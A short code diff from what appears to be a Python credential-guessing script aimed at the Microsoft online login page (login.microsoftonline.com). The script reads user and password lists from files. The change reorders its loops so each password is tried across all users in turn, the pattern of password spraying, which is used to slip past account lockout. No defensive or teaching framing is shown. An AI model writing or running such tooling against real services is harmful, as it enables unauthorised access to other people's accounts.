@@ -8,8 +8,8 @@ userList = [line.strip() for line in open(sys.argv[1], 'r')]
 passwordList = [line.strip() for line in open(sys.argv[2], 'r')]
 
 #Loop through each user vs all passwords, then go to the next user.
-for user in userList:
-    for password in passwordList:
+for password in passwordList:
+    for user in userList:
         #Create session and grab initial cookies for microsoft online main login page
         targetURL = "https://login.microsoftonline.com"
         session = requests.Session()
